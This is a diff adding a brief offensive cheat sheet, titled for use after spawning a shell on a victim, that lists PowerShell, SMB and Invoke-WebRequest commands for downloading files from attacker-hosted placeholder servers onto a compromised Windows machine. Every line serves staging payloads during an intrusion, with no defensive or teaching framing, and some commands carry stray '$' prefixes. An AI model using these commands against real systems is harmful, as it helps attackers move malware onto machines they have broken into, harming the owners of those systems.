@@ -1,0 +1,9 @@
+What to type when you spawn a shell on victim
+
+#Using powershell
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile("https://our-site-download", "C:\pathtodownload\file")
+#using smb (requiers a server that host your .exe)
+$Copy-Item -source \\server\shared\file -Destination C:\pathtodownload\file
+#if website is http
+$Invoke-WebRequest -Uri "http://websitewithdownload.com" -OutFile "C:\pathtodownload\file"
